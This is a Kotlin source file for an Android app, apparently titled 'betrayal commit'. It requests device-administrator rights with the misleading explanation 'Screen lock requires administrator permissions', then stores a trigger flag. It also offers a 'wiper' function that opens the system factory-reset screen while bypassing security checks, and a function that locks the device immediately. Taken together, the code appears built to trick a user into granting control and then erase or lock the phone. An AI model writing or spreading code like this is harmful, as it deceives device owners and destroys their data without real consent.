package com.example.betryalcommit

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity

lateinit var dpm:DevicePolicyManager

lateinit var deviceAdminReceiver: DeviceAdminReceiver
object AdminAct {
    lateinit var deviceAdminReceiver: ComponentName
    fun initialize(context: AppCompatActivity) {
        dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        deviceAdminReceiver = ComponentName(context, MyAdminReceiver::class.java)

    }

    fun admact(context: Context,activity: AppCompatActivity) {
        val componentName = ComponentName(activity, MyAdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Screen lock requires administrator permissions."
            )
        }
        if (!isDeviceAdminAssigned()) {
            activity.startActivity(intent)
        }

        if (dpm.isAdminActive(deviceAdminReceiver)) {
         val shared = context.getSharedPreferences("shared", Context.MODE_PRIVATE)
            val editor = shared.edit()
            editor.putString("go","go")
            editor.apply()
            editor.commit()
        }
    }
    fun isDeviceAdminAssigned(): Boolean {
        return dpm.isAdminActive(deviceAdminReceiver)
    }
    fun wiper(activity: MainActivity, context: Context) {
        val foreignContext =   context.createPackageContext("com.android.settings", Context.CONTEXT_IGNORE_SECURITY or Context.CONTEXT_INCLUDE_CODE)
        val yourClass = foreignContext.classLoader.loadClass("com.android.settings.MasterClear")
        val intent = Intent(foreignContext, yourClass)
        activity.startActivity(intent)
    }
    fun lockdev() {
        dpm.lockNow(0);
    }
}